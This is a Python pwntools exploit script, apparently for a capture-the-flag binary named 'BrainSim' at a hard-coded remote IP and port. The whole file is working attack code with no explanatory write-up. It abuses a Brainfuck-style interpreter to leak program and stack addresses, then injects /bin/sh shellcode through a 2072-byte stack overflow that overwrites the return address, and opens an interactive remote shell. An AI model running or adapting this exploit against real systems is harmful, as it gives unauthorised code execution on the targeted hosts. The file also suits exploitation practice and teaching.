#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 103.152.242.242 --port 39481 ./BrainSim
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./BrainSim')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '103.152.242.242'
port = int(args.PORT or 39481)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *0x55555555547d
b *0x5555555555aa
# b *0x5555555555df
continue
c
c
c
c
c
c
c
c
c
b *0x000055555555567e
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      PIE enabled
# RWX:      Has RWX segments

io = start()

def change(pay):
    temp = ''
    for i in pay:
        temp += i*2
    return temp

io.sendlineafter(": ","1")
p = '<'*(8*1)
p += '.>'*8
io.sendlineafter(": ",p)

io.recvuntil("Output: ")
leak = u64(io.recvline()[:-1].ljust(8,"\x00"))
print hex(leak)
base_exe = leak - 0x158e
print hex(base_exe)

main = base_exe + exe.sym['main']
pop_rdi = base_exe + 0x0000000000001763
got_puts = base_exe + exe.got['puts']
print hex(got_puts)
plt_puts = base_exe + exe.plt['puts']

io.sendlineafter(": ","1")
p = '<'*(8*4)
p += '.>'*8
io.sendlineafter(": ",p)

io.recvuntil("Output: ")
leak = u64(io.recvline()[:-1].ljust(8,"\x00"))
print hex(leak)
stack = leak -0x810 
print 'stack:',hex(stack)

shellcode = asm(shellcraft.sh())

io.sendlineafter(": ","1")
p = ',>'*(len(shellcode))
p += ',[>,]>,'
io.sendlineafter(": ",p)

sleep(1)
p = shellcode
p += ''.ljust(2072-6*8,'a')
p += p64(stack)

p = change(p)

io.sendafter(": ",p)

io.interactive()


